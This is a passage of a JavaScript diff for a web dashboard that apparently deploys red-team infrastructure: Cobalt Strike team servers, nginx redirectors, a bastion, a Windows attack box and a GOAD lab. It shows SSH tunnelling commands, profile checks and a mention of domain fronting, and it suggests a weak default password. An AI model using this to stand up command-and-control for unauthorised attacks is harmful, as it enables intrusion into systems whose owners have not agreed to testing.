+                <p style="${noteStyle}">Profile location: <code class="code-inline">/opt/cobaltstrike/profiles/${malleableProfile}.profile</code> &mdash; Re-run manually: <code class="code-inline">cd /opt/cobaltstrike/server && ./c2lint /opt/cobaltstrike/profiles/${malleableProfile}.profile</code></p>
+            </div>`;
+    } else {
+        // Custom profile: auto-deployed from web app — show verification step
+        steps += `
+            <div style="${stepStyle} border-left: 3px solid var(--brand);">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Verify Custom Malleable C2 Profile</strong>
+                    <span style="margin-left: 8px; background: var(--info-bg, rgba(59,130,246,0.15)); color: var(--brand); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Auto-deployed</span>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">Your custom profile was automatically deployed to the team server and nginx redirectors were configured with the parsed URIs. Verify everything is working:</p>
+                <div class="terminal-block" style="margin: 8px 0; font-size: 0.88em;">
+                    <div style="color: var(--text-muted); margin-bottom: 6px;">On the team server:</div>
+                    <code class="t-terminal">1.</code> <span class="t-terminal">Check profile: <code style="background: transparent; color: var(--text-terminal);">cat /opt/cobaltstrike/profiles/custom.profile</code></span><br>
+                    <code class="t-terminal">2.</code> <span class="t-terminal">Validate: <code style="background: transparent; color: var(--text-terminal);">cd /opt/cobaltstrike/server && ./c2lint /opt/cobaltstrike/profiles/custom.profile</code></span><br>
+                    <code class="t-terminal">3.</code> <span class="t-terminal">Check service: <code style="background: transparent; color: var(--text-terminal);">/opt/cobaltstrike/check-status.sh</code></span><br><br>
+                    <div style="color: var(--text-muted); margin-bottom: 6px;">On each redirector:</div>
+                    <code class="t-terminal">4.</code> <span class="t-terminal">Check nginx: <code style="background: transparent; color: var(--text-terminal);">sudo nginx -t</code></span><br>
+                    <code class="t-terminal">5.</code> <span class="t-terminal">View URI config: <code style="background: transparent; color: var(--text-terminal);">grep -A2 'location ~' /etc/nginx/sites-available/c2-redirector</code></span>
+                </div>
+                <p style="${noteStyle}">c2lint was run automatically during deployment. Check results: <code>cat /var/log/cs-install.log | grep -A5 c2lint</code>. If errors were found, edit the profile at <code>/opt/cobaltstrike/profiles/custom.profile</code> and restart the team server.</p>
+            </div>`;
+    }
+    stepNum++;
+
+    // Step: Attack box (only if enabled)
+    if (attackBox.enabled) {
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Activate CS Client on Attack Box</strong>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">RDP to the Windows Attack Box and activate the CS client license.</p>
+                ${renderCopyableCommand('Run on Attack Box:', `C:\\Tools\\CobaltStrike\\update.bat`)}
+                <p style="${noteStyle}">Enter your license key when prompted. Java 17+ is pre-installed. Connection details are in the Connection Info section above.</p>
+            </div>`;
+        stepNum++;
+
+        // Step: Finalize WSL Ubuntu on Attack Box
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Finalize WSL Ubuntu on Attack Box</strong>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">WSL requires an interactive session to install Ubuntu. RDP to the Attack Box and run in PowerShell:</p>
+                ${renderCopyableCommand('1. Set WSL1 (EC2 lacks nested virt for WSL2):', `wsl --set-default-version 1`)}
+                ${renderCopyableCommand('2. Install Ubuntu:', `wsl --install -d Ubuntu`)}
+                <p style="margin: 4px 0 8px 0; font-size: 0.88em; color: var(--text-secondary);">When Ubuntu launches for the first time, it will prompt for a UNIX username and password. Use <code class="code-inline">ubuntu</code> / <code class="code-inline">password</code> (or your own choice). Windows Terminal has a pre-configured <strong>WSL Ubuntu</strong> profile that will auto-detect the distro.</p>
+                <p style="${noteStyle}">WSL was enabled during bootstrap but Ubuntu must be installed via RDP — WSL commands cannot run as SYSTEM (the RunOnce auto-install fails silently for this reason).</p>
+            </div>`;
+        stepNum++;
+    }
+
+    // Step: Test connectivity
+    steps += `
+        <div style="${stepStyle}">
+            <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                <span style="${numStyle}">${stepNum}</span>
+                <strong style="font-size: 0.95em;">Test End-to-End Connectivity</strong>
+            </div>
+            <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">Verify that your domain resolves to the redirector and HTTPS is working.</p>
+            ${renderCopyableCommand('', `curl -k https://${domain}/`)}
+            <p style="${noteStyle}">You should get an HTTP response (the default page or a redirect). If using domain fronting, test with the front domain's Host header.</p>
+        </div>`;
+
+    return `
+        <div style="padding: 4px 0;">
+            <p style="margin: 0 0 14px 0; font-size: 0.9em; color: var(--text-secondary);">
+                Complete these steps in order to bring your C2 infrastructure fully online.
+            </p>
+            ${steps}
+        </div>`;
+}
+
+function renderC2ConnectionInfo(projectData) {
+    if (!projectData) return '<div class="t-muted">Loading infrastructure data...</div>';
+
+    const config = projectData.config || {};
+    const bastion = projectData.bastion || {};
+    const bastionIp = bastion.public_ip || '';
+    const c2Servers = projectData.c2_servers || {};
+    const redirectors = projectData.redirectors || {};
+    const servers = c2Servers.servers || {};
+    const serverIds = c2Servers.instance_ids || [];
+    const serverIps = c2Servers.private_ips || [];
+    const redirIds = redirectors.instance_ids || [];
+    const redirPublicIps = redirectors.public_ips || [];
+    const redirPrivateIps = redirectors.private_ips || [];
+
+    // Resolve local SSH key path from uploaded public key metadata
+    let keyPath = '~/.ssh/your_key';
+    let isDefaultPath = true;
+    if (cachedSshKeyData) {
+        const comment = cachedSshKeyData.comment || '';
+        const keyType = cachedSshKeyData.key_type || '';
+        if (comment.includes('/.ssh/')) {
+            keyPath = comment.trim();
+            isDefaultPath = false;
+        } else if (comment.match(/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+$/)) {
+            // Email comment — infer default key path from type
+            keyPath = keyType === 'ssh-ed25519' ? '~/.ssh/id_ed25519' : keyType === 'ssh-rsa' ? '~/.ssh/id_rsa' : '~/.ssh/id_ed25519';
+            isDefaultPath = false;
+        } else if (comment && !comment.includes('@') && !comment.includes(' ')) {
+            keyPath = `~/.ssh/${comment}`;
+            isDefaultPath = false;
+        }
+    }
+
+    let html = '';
+
+    // SSH Access Info
+    html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--bg-section); border-radius: 6px;">
+            <strong style="font-size: 1em;">SSH Access</strong>
+            <div style="display: grid; grid-template-columns: auto auto; gap: 6px 12px; margin-top: 10px; align-items: center; justify-content: start;">
+                <span class="t-secondary">Your private key:</span>
+                <code class="code-inline" style="width: fit-content;">${keyPath}</code>
+                <span class="t-secondary">Remote user:</span>
+                <code class="code-inline" style="width: fit-content;">ubuntu</code>
+            </div>
+            ${isDefaultPath ? `<div style="margin-top: 8px; font-size: 0.9em; color: var(--text-muted);">Replace <code>your_key</code> with your private key path (e.g. <code>~/.ssh/id_ed25519</code>)</div>` : ''}
+        </div>`;
+
+    // Attack Box (Windows workstation)
+    const attackBox = projectData.attack_box || {};
+    if (attackBox.enabled && attackBox.private_ip) {
+        const abIp = attackBox.private_ip;
+        const abPassword = attackBox.admin_password || '';
+        const jumpHost = bastionIp || '';
+        html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--info-bg); border-radius: 6px; border-left: 3px solid var(--info);">
+            <strong style="color: var(--info-text); font-size: 1em;">Windows Attack Box</strong>
+            <span style="margin-left: 10px;"><code class="code-inline">${abIp}</code></span>
+            <div style="display: grid; grid-template-columns: auto auto; gap: 6px 12px; margin-top: 10px; align-items: center; justify-content: start;">
+                <span class="t-secondary">Username:</span>
+                <code class="code-inline" style="width: fit-content;">Administrator</code>
+                <span class="t-secondary">Password:</span>
+                ${abPassword
+                    ? `<span style="display: flex; align-items: center; gap: 6px;"><code class="code-inline">${abPassword}</code><button onclick="copyToClipboard('${abPassword.replace(/'/g, "\\'")}', this)" style="background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 3px 8px; border-radius: 4px; cursor: pointer; font-size: 0.75em; white-space: nowrap;">Copy</button></span>`
+                    : `<span class="t-warning">Not available — check Terraform outputs</span>`}
+            </div>
+            ${jumpHost ? `<div style="margin-top: 12px; font-weight: 600; font-size: 0.95em; color: var(--text-primary);">SSH Access (via Bastion)</div>` : ''}
+            ${jumpHost ? renderCopyableCommand('', `ssh -J ubuntu@${jumpHost} -i ${keyPath} Administrator@${abIp}`) : ''}
+            ${jumpHost ? `<div style="margin-top: 12px; font-weight: 600; font-size: 0.95em; color: var(--text-primary);">RDP Access (via Bastion tunnel)</div>` : ''}
+            ${jumpHost ? renderCopyableCommand('1. Start tunnel:', `ssh -L 3390:${abIp}:3389 -i ${keyPath} ubuntu@${jumpHost}`) : ''}
+            ${jumpHost ? `<div style="margin-top: 6px; font-size: 0.9em; color: var(--text-secondary);">2. Connect your RDP client to <code class="code-inline">localhost:3390</code></div>` : ''}
+            ${jumpHost ? renderCopyableCommand('3. Verify tunnel:', `lsof -i :3390`) : ''}
+            <div style="margin-top: 10px; padding: 10px 12px; background: var(--warning-bg); border-radius: 4px; border-left: 3px solid var(--warning); font-size: 0.9em;">
+                <strong class="t-warning">Change this password on first login.</strong>
+                <span class="t-secondary"> Auto-generated by EC2Launch v2 during boot. Change via SSH or RDP:</span>
+                ${renderCopyableCommand('', 'net user Administrator NewPasswordHere')}
+            </div>
+        </div>`;
+    }
+
+    // Bastion
+    if (bastion.enabled && bastionIp) {
+        html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--bg-section); border-radius: 6px; border-left: 3px solid var(--brand);">
+            <strong style="font-size: 1em;">Bastion Host</strong>
+            <span style="margin-left: 10px;"><code class="code-inline">${bastionIp}</code></span>
+            <div style="margin-top: 4px; font-size: 0.9em; color: var(--text-muted);">SSH relay into private subnets — all C2 and attack box access goes through here</div>
+            ${renderCopyableCommand('SSH:', `ssh -i ${keyPath} ubuntu@${bastionIp}`)}
+        </div>`;
+    }
+
+    // C2 Servers
+    const serverEntries = Object.keys(servers).length > 0
+        ? Object.entries(servers).map(([name, s]) => ({ name, instanceId: s.instance_id, privateIp: s.private_ip, phase: s.phase }))
+        : serverIds.map((id, idx) => ({ name: `C2 Server ${idx + 1}`, instanceId: id, privateIp: serverIps[idx], phase: null }));
+    const totalServers = serverEntries.length;
+
+    for (let sIdx = 0; sIdx < serverEntries.length; sIdx++) {
+        const srv = serverEntries[sIdx];
+        if (!srv.privateIp) continue;
+        // Friendly display name: "C2 Team Server" for single, "C2 Team Server 1 (phase)" for multiple
+        const phaseLabel = srv.phase && srv.phase !== 'generic' ? ` — ${srv.phase}` : '';
+        const serverLabel = totalServers === 1 ? 'C2 Team Server' : `C2 Team Server ${sIdx + 1}`;
+        html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--danger-bg); border-radius: 6px; border-left: 3px solid var(--danger);">
+            <strong style="color: var(--danger-text); font-size: 1em;">${serverLabel}${phaseLabel}</strong>
+            <span style="margin-left: 10px;"><code class="code-inline">${srv.privateIp}</code></span>
+            ${bastionIp ? renderCopyableCommand('SSH via Bastion:', `ssh -J ubuntu@${bastionIp} -i ${keyPath} ubuntu@${srv.privateIp}`) : ''}
+            ${bastionIp ? renderCopyableCommand('CS Port Forward:', `ssh -L 50050:${srv.privateIp}:50050 -i ${keyPath} ubuntu@${bastionIp}`) : ''}
+        </div>`;
+    }
+
+    // Redirectors
+    for (let idx = 0; idx < redirIds.length; idx++) {
+        const pubIp = redirPublicIps[idx] || 'N/A';
+        html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--success-bg); border-radius: 6px; border-left: 3px solid var(--success);">
+            <strong style="color: var(--success-text); font-size: 1em;">Redirector ${idx + 1}</strong>
+            <span style="margin-left: 10px;"><code class="code-inline">${pubIp}</code></span>
+            ${pubIp !== 'N/A' ? renderCopyableCommand('SSH:', `ssh -i ${keyPath} ubuntu@${pubIp}`) : ''}
+        </div>`;
+    }
+
+    // GOAD Infrastructure (combined deployments only)
+    const deployType = projectData.deployment_type || '';
+    const goadData = projectData.goad || {};
+    if (deployType.startsWith('combined-') && goadData.deployed) {
+        html += `
+        <div style="margin-top: 20px; margin-bottom: 14px; padding-bottom: 4px; border-bottom: 1px solid var(--border); font-size: 1.05em; font-weight: 600; color: var(--text-primary);">GOAD Infrastructure</div>`;
+
+        // Jumpbox
+        const jumpboxIp = goadData.jumpbox?.public_ip || '';
+        if (jumpboxIp) {
+            html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--bg-section); border-radius: 6px; border-left: 3px solid var(--brand);">
+            <strong style="font-size: 1em;">GOAD Jumpbox</strong>
+            <span style="margin-left: 10px;"><code class="code-inline">${jumpboxIp}</code></span>
+            <div style="margin-top: 4px; font-size: 0.9em; color: var(--text-muted);">SSH gateway into the GOAD lab network — Ansible + GOAD repo pre-installed</div>
+            ${renderCopyableCommand('SSH:', `ssh -i ${keyPath} ubuntu@${jumpboxIp}`)}
+        </div>`;
+        }
+
+        // Windows VMs
+        const goadVms = goadData.vms || [];
+        if (goadVms.length > 0) {
+            let vmRows = '';
+            for (const vm of goadVms) {
+                const hostname = vm.hostname || vm.id || 'Unknown';
+                const role = vm.role || '';
+                const domain = vm.domain || '';
+                const privIp = vm.private_ip || '-';
+                const roleLabel = role === 'DC' ? 'Domain Controller' : role === 'Server' ? 'Member Server' : role || '-';
+                vmRows += `
+                    <tr>
+                        <td style="padding: 6px 10px; font-weight: 600;">${hostname}</td>
+                        <td style="padding: 6px 10px;"><code class="code-inline">${privIp}</code></td>
+                        <td style="padding: 6px 10px;">${roleLabel}</td>
+                        <td style="padding: 6px 10px; font-size: 0.9em; color: var(--text-secondary);">${domain}</td>
+                    </tr>`;
+            }
+            html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--bg-section); border-radius: 6px;">
+            <strong style="font-size: 1em;">GOAD Windows VMs</strong>
+            <span style="margin-left: 10px; font-size: 0.9em; color: var(--text-muted);">${goadVms.length} VM${goadVms.length !== 1 ? 's' : ''}</span>
+            <div style="margin-top: 10px; overflow-x: auto;">
+                <table style="width: 100%; border-collapse: collapse; font-size: 0.92em;">
+                    <thead>
+                        <tr style="background: var(--bg-elevated); border-bottom: 1px solid var(--border);">
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Hostname</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Private IP</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Role</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Domain</th>
+                        </tr>
+                    </thead>
+                    <tbody>${vmRows}
+                    </tbody>
+                </table>
+            </div>
+            ${jumpboxIp ? `<div style="margin-top: 10px; font-size: 0.88em; color: var(--text-muted);">RDP to a Windows VM via jumpbox tunnel:</div>` : ''}
+            ${jumpboxIp && goadVms[0]?.private_ip ? renderCopyableCommand('', `ssh -L 3389:${goadVms[0].private_ip}:3389 -i ${keyPath} ubuntu@${jumpboxIp}`) : ''}
+            ${jumpboxIp ? `<div style="font-size: 0.85em; color: var(--text-secondary);">Then connect your RDP client to <code class="code-inline">localhost:3389</code>. Change the target IP for other VMs.</div>` : ''}
+        </div>`;
+        }
+
+        // AD Domain Info
+        const domainInfo = goadData.domain_info || {};
+        const domainNames = Object.keys(domainInfo);
+        if (domainNames.length > 0) {
+            let domainRows = '';
+            for (const domain of domainNames) {
+                const info = domainInfo[domain] || {};
+                const dc = info.dc || '-';
+                domainRows += `
+                    <tr>
+                        <td style="padding: 6px 10px; font-weight: 600;">${domain}</td>
+                        <td style="padding: 6px 10px; color: var(--text-secondary);">${dc}</td>
+                    </tr>`;
+            }
+            html += `
+        <div style="margin-bottom: 14px; padding: 14px; background: var(--bg-section); border-radius: 6px;">
+            <strong style="font-size: 1em;">AD Domains</strong>
+            <span style="margin-left: 10px; font-size: 0.9em; color: var(--text-muted);">${domainNames.length} domain${domainNames.length !== 1 ? 's' : ''}</span>
+            <div style="margin-top: 10px; overflow-x: auto;">
+                <table style="width: 100%; border-collapse: collapse; font-size: 0.92em;">
+                    <thead>
+                        <tr style="background: var(--bg-elevated); border-bottom: 1px solid var(--border);">
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Domain</th>
+                            <th style="padding: 6px 10px; text-align: left; color: var(--text-secondary); font-weight: 600;">Domain Controller</th>
+                        </tr>
+                    </thead>
+                    <tbody>${domainRows}
+                    </tbody>
+                </table>
+            </div>
+        </div>`;
+        }
+
+        // Lab info summary (if available)
+        const labInfo = goadData.lab_info || {};
+        const labType = goadData.lab_type || '';
+        if (labType) {
+            html += `
+        <div style="margin-bottom: 14px; padding: 10px 14px; background: var(--bg-section); border-radius: 6px; font-size: 0.9em;">
+            <span class="t-secondary">Lab type:</span> <strong>${labType}</strong>
+            ${labInfo.forests ? ` &middot; <span class="t-secondary">${labInfo.forests} forest${labInfo.forests !== 1 ? 's' : ''}</span>` : ''}
+            ${labInfo.domains ? ` &middot; <span class="t-secondary">${labInfo.domains} domain${labInfo.domains !== 1 ? 's' : ''}</span>` : ''}
+            ${labInfo.description ? `<div style="margin-top: 6px; color: var(--text-muted);">${labInfo.description}</div>` : ''}
+        </div>`;
+        }
+    }
+
+    return html || '<div class="t-muted">No C2 infrastructure details available.</div>';
+}
+
 function escapeHtml(text) {
     if (!text) return '';
     const div = document.createElement('div');
@@ -9181,280 +16099,400 @@ function escapeHtml(text) {
 }
 
 /**
- * Populate Bastion Host section
+ * Populate the unified C2 Deployment section with all components
  */
-function populateBastionSection(bastion) {
-    const section = document.getElementById('bastion-section');
-    const details = document.getElementById('bastion-details');
-    
-    if (!bastion || !bastion.enabled) {
-        if (section) section.style.display = 'none';
-        return;
+/**
+ * Render a copyable command block with a Copy button
+ */
+function renderCopyableCommand(label, command) {
+    const escaped = command.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+    return `
+    <div style="margin-top: 6px; margin-bottom: 8px;">
+        ${label ? `<span style="color: var(--text-secondary); font-size: 0.95em; display: block; margin-bottom: 4px;">${label}</span>` : ''}
+        <div style="position: relative; background: var(--bg-terminal); border-radius: 4px; overflow: hidden;">
+            <button onclick="copyToClipboard('${escaped}', this)"
+                    style="position: absolute; top: 8px; right: 8px; background: var(--bg-elevated); color: var(--text-secondary); border: 1px solid var(--border-light); padding: 4px 10px; border-radius: 4px; cursor: pointer; font-size: 0.8em; z-index: 10;">
+                Copy
+            </button>
+            <div style="color: var(--text-terminal); padding: 12px; padding-right: 80px; font-family: 'SF Mono', Monaco, Consolas, monospace; font-size: 0.95em; overflow-x: auto; white-space: nowrap;">
+                ${command}
+            </div>
+        </div>
+    </div>`;
+}
+
+/**
+ * Load SSL status for redirectors by SSH'ing into them via the backend
+ */
+async function loadSSLStatus() {
+    const sslContent = document.getElementById('ssl-status-content');
+    if (!sslContent) return;
+
+    // Show loading state with explanation
+    sslContent.innerHTML = `
+        <div style="display: flex; align-items: center; gap: 10px; padding: 12px; background: var(--bg-container); border-radius: 6px;">
+            <div class="spinner" style="width: 20px; height: 20px;"></div>
+            <div>
+                <strong class="t-primary">Connecting to redirector(s) via SSH...</strong>
+                <p style="margin: 4px 0 0 0; font-size: 0.88em; color: var(--text-secondary);">
+                    Reading <code>/opt/ssl-status.json</code> from each redirector
+                </p>
+            </div>
+        </div>
+    `;
+
+    try {
+        // Get project name from the current deployment context
+        const projectName = document.getElementById('aws-project-tag')?.textContent?.trim()
+            || document.querySelector('[data-project-name]')?.dataset.projectName
+            || '';
+
+        const response = await fetch(`${API_BASE}/deploy/ssl-status?project=${encodeURIComponent(projectName)}`);
+        const data = await response.json();
+
+        if (!data.success) {
+            sslContent.innerHTML = `
+                <div class="alert-box alert-box--danger" style="margin-top: 0;">
+                    <strong class="t-danger">Failed to fetch SSL status</strong>
+                    <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">${data.error || 'Unknown error'}</p>
+                </div>
+            `;
+            return;
+        }
+
+        if (!data.redirectors || data.redirectors.length === 0) {
+            sslContent.innerHTML = '<p class="t-secondary">No running redirectors found</p>';
+            return;
+        }
+
+        // Also fetch DNS status to know which IPs are active in Route53
+        let activeIps = [];
+        let dnsDomain = '';
+        let dnsTtl = 300;
+        try {
+            const dnsResp = await fetch(`${API_BASE}/deploy/redirector-dns-status?project=${encodeURIComponent(projectName)}`);
+            const dnsData = await dnsResp.json();
+            if (dnsData.success) {
+                activeIps = dnsData.active_ips || [];
+                dnsDomain = dnsData.domain || '';
+                dnsTtl = dnsData.ttl || 300;
+            }
+        } catch (e) {
+            console.warn('Could not fetch DNS status:', e);
+        }
+
+        // Merge DNS active status into each redirector
+        for (const redir of data.redirectors) {
+            redir.dns_active = activeIps.length === 0 || activeIps.includes(redir.ip);
+        }
+
+        // Build status HTML for each redirector
+        let html = '<div style="display: grid; gap: 15px;">';
+
+        // DNS domain + active IPs summary
+        if (dnsDomain && activeIps.length > 0) {
+            html += `
+                <div style="padding: 10px 12px; background: var(--bg-container); border-radius: 6px; font-size: 0.88em; border: 1px solid var(--border);">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
+                        <strong>DNS: <code class="code-inline">${dnsDomain}</code></strong>
+                        <span style="font-size: 0.82em; color: var(--text-muted);">TTL: ${dnsTtl}s</span>
+                    </div>
+                    <div style="font-size: 0.85em; color: var(--text-secondary);">
+                        Active A records: ${activeIps.map(ip => `<code class="code-inline">${ip}</code>`).join(', ')}
+                        <span style="margin-left: 8px; color: var(--text-muted);">(${activeIps.length} of ${data.redirectors.length} redirectors)</span>
+                    </div>
+                </div>
+            `;
+        }
+
+        // SSH method notice
+        html += `
+            <div style="padding: 10px 12px; background: var(--bg-container); border-radius: 6px; font-size: 0.85em; color: var(--text-muted); display: flex; align-items: center; gap: 8px;">
+                <span>🔗</span>
+                <span>Status fetched via <strong>SSH</strong> into each redirector using key <code class="code-inline">${data.ssh_key_used || '~/.ssh/id_ed25519'}</code></span>
+            </div>
+        `;
+
+        for (const redir of data.redirectors) {
+            html += buildRedirectorSSLCard(redir);
+        }
+
+        html += '</div>';
+        sslContent.innerHTML = html;
+
+        // Cache the result and update timestamp (persisted to localStorage, per-project)
+        cachedSSLStatusData = html;
+        cachedSSLStatusTime = new Date();
+        try {
+            const key = _sslCacheKey(projectName);
+            localStorage.setItem(key, JSON.stringify({ html, time: cachedSSLStatusTime.toISOString() }));
+        } catch (e) { /* ignore quota errors */ }
+        updateSSLTimestamp();
+
+    } catch (error) {
+        console.error('Error loading SSL status:', error);
+        sslContent.innerHTML = `
+            <div class="alert-box alert-box--danger" style="margin-top: 0;">
+                <strong class="t-danger">Error fetching SSL status</strong>
+                <p style="margin: 5px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">${error.message}</p>
+                <p style="margin: 8px 0 0 0; font-size: 0.85em; color: var(--text-muted);">
+                    Manual check: <code class="code-inline">ssh ubuntu@REDIRECTOR_IP cat /opt/ssl-status.json</code>
+                </p>
+            </div>
+        `;
     }
-    
-    section.style.display = 'block';
-    details.innerHTML = `
-        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
-            <div style="background: var(--bg-card); padding: 15px; border-radius: 5px;">
-                <strong>Public IP:</strong><br>
-                <code style="background: var(--bg-terminal); padding: 5px 10px; border-radius: 3px; display: inline-block; margin-top: 5px;">${bastion.public_ip || 'N/A'}</code>
+}
+
+/**
+ * Update the "Last refreshed" timestamp display
+ */
+function updateSSLTimestamp() {
+    const el = document.getElementById('ssl-last-refreshed');
+    if (el && cachedSSLStatusTime) {
+        el.textContent = `Last refreshed: ${cachedSSLStatusTime.toLocaleDateString()} ${cachedSSLStatusTime.toLocaleTimeString()}`;
+    }
+}
+
+/**
+ * Build the SSL status card HTML for a single redirector
+ */
+function buildRedirectorSSLCard(redir) {
+    const ssl = redir.ssl_status || {};
+    const status = ssl.status || 'unknown';
+    const sshOk = redir.ssh_status === 'connected';
+
+    // Status badge config
+    const statusConfig = {
+        'valid':           { icon: '✅', label: 'Certificate Active', bg: 'var(--success-bg)', color: 'var(--success-text)', border: 'var(--success)' },
+        'pending':         { icon: '⏳', label: 'Pending — Retrying', bg: 'var(--warning-bg)', color: 'var(--warning-text)', border: 'var(--warning)' },
+        'waiting_dns':     { icon: '🔄', label: 'Waiting for DNS', bg: 'var(--info-bg)', color: 'var(--info-text)', border: 'var(--info)' },
+        'self-signed':     { icon: '⚠️', label: 'Self-Signed', bg: 'var(--warning-bg)', color: 'var(--warning-text)', border: 'var(--warning)' },
+        'manual_required': { icon: '🔧', label: 'Manual Action Required', bg: 'var(--danger-bg)', color: 'var(--danger-text)', border: 'var(--danger)' },
+        'disabled':        { icon: '⛔', label: 'SSL Disabled', bg: 'var(--bg-container)', color: 'var(--text-secondary)', border: 'var(--border)' },
+        'no_status_file':  { icon: '❓', label: 'No Status File', bg: 'var(--bg-container)', color: 'var(--text-secondary)', border: 'var(--border)' },
+        'unknown':         { icon: '❓', label: 'Unknown', bg: 'var(--bg-container)', color: 'var(--text-secondary)', border: 'var(--border)' },
+        'parse_error':     { icon: '⚠️', label: 'Status Parse Error', bg: 'var(--warning-bg)', color: 'var(--warning-text)', border: 'var(--warning)' }
+    };
+
+    const cfg = statusConfig[status] || statusConfig['unknown'];
+
+    // SSH connection failed
+    if (!sshOk) {
+        return `
+            <div style="padding: 12px; background: var(--danger-bg); border-radius: 8px; border-left: 4px solid var(--danger);">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+                    <strong class="t-danger">🔀 ${redir.name}</strong>
+                    <code class="code-inline" style="font-size: 0.85em;">${redir.ip}</code>
+                </div>
+                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+                    <span style="font-size: 1.2em;">❌</span>
+                    <strong class="t-danger">SSH Connection Failed</strong>
+                </div>
+                <p style="margin: 0; font-size: 0.88em; color: var(--text-secondary);">
+                    ${redir.error || 'Could not connect to redirector'}
+                </p>
+                <p style="margin: 8px 0 0 0; font-size: 0.85em; color: var(--text-muted);">
+                    Check that your IP is in the management CIDR and the redirector is running.
+                </p>
             </div>
-            <div style="background: var(--bg-card); padding: 15px; border-radius: 5px;">
-                <strong>Private IP:</strong><br>
-                <code style="background: var(--bg-terminal); padding: 5px 10px; border-radius: 3px; display: inline-block; margin-top: 5px;">${bastion.private_ip || 'N/A'}</code>
+        `;
+    }
+
+    // Build detail rows
+    let details = '';
+    if (ssl.domain) {
+        details += `<div><strong>Domain:</strong> <code class="code-inline">${ssl.domain}</code></div>`;
+    }
+    if (ssl.cert_type) {
+        details += `<div><strong>Cert Type:</strong> ${ssl.cert_type}</div>`;
+    }
+    if (ssl.expiry) {
+        details += `<div><strong>Expires:</strong> ${ssl.expiry}</div>`;
+    }
+    if (ssl.provider) {
+        details += `<div><strong>Provider:</strong> ${ssl.provider}</div>`;
+    }
+    if (ssl.last_updated) {
+        details += `<div><strong>Last Checked:</strong> ${ssl.last_updated}</div>`;
+    }
+    if (ssl.message) {
+        details += `<div style="margin-top: 6px; padding: 8px; background: var(--bg-terminal); border-radius: 4px; font-size: 0.9em;">${ssl.message}</div>`;
+    }
+
+    // Log tail (collapsible)
+    let logHtml = '';
+    if (redir.log_tail && redir.log_tail !== 'No log file') {
+        const escapedLog = redir.log_tail.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        logHtml = `
+            <details style="margin-top: 10px;">
+                <summary style="cursor: pointer; font-size: 0.88em; color: var(--text-muted); user-select: none;">
+                    📄 Recent auto-request log (last 10 lines)
+                </summary>
+                <pre class="terminal-block" style="margin: 8px 0 0 0; font-size: 0.82em; white-space: pre-wrap; max-height: 200px; overflow-y: auto;">${escapedLog}</pre>
+            </details>
+        `;
+    }
+
+    // DNS toggle — shows whether this redirector's IP is active in DNS
+    const isActiveInDns = redir.dns_active !== false; // default to active if unknown
+    const toggleId = `dns-toggle-${redir.ip.replace(/\./g, '-')}`;
+    const dnsToggleHtml = `
+        <div style="margin-top: 10px; padding: 10px; background: var(--bg-container); border-radius: 6px; border: 1px solid var(--border);">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                    <strong style="font-size: 0.9em;">DNS Status</strong>
+                    <span id="${toggleId}-label" style="margin-left: 8px; font-size: 0.85em; padding: 2px 8px; border-radius: 10px; background: ${isActiveInDns ? 'var(--success-bg)' : 'var(--danger-bg)'}; color: ${isActiveInDns ? 'var(--success-text)' : 'var(--danger-text)'};">
+                        ${isActiveInDns ? 'Active in DNS' : 'Removed from DNS'}
+                    </span>
+                </div>
+                <label style="position: relative; display: inline-block; width: 48px; height: 26px; cursor: pointer;">
+                    <input type="checkbox" id="${toggleId}" ${isActiveInDns ? 'checked' : ''}
+                        onchange="toggleRedirectorDNS('${redir.ip}', this.checked)"
+                        style="opacity: 0; width: 0; height: 0;">
+                    <span style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: ${isActiveInDns ? 'var(--success)' : '#ccc'}; border-radius: 26px; transition: 0.3s;"></span>
+                    <span style="position: absolute; top: 3px; left: ${isActiveInDns ? '25px' : '3px'}; width: 20px; height: 20px; background: white; border-radius: 50%; transition: 0.3s; box-shadow: 0 1px 3px rgba(0,0,0,0.3);"></span>
+                </label>
             </div>
+            <p style="margin: 6px 0 0 0; font-size: 0.82em; color: var(--text-muted);">
+                ${isActiveInDns
